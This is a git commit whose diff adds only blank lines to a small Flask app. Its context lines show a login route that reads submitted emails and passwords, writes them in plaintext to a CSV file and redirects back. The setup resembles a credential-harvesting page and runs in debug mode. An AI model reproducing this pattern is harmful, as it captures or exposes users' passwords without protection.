8cbc5432f0eaf5e88eb0eb32b031054cc2f4711c
Nikhil p rao <nikhilprao9066@gmail.com>
2024-03-31 13:14:52 -0400

    Fix issue removing white spaces

--- app.py
+++ app.py
@@ -15,6 +15,7 @@ app = Flask(__name__)
 def index():
     return render_template('login.html')
 
+
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form['email']
@@ -26,6 +27,7 @@ def login():
         writer.writerow([email, password])
     
     return redirect(url_for('index'))
+
 
 if __name__ == '__main__':
     app.run(debug=True)
